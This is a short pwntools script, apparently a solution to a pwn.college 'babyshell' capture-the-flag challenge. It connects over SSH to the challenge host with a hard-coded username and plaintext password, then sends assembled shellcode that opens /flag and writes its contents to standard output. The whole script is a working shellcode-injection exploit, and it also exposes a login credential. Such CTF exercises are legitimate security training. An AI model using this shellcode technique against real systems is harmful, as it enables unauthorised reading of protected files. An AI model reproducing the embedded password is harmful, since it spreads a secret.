from pwn import *

e = ELF('./babyshell_level1_testing1')
# libc = ELF('../../libc6_2.31-0ubuntu9.2_amd64.so')
s = ssh(user="ssu-csec",host="ssu-csec.pwn.college",keyfile='../../csec',port=22,password='djaxod12')
p = s.run('/babyshell_level1_testing1')

context.arch = e.arch
context.os = e.os

pay = shellcraft.open('/flag',0)
pay += shellcraft.sendfile(1,3,0,0xff)
print(pay)
pay = asm(pay)
p.send(pay)

p.interactive()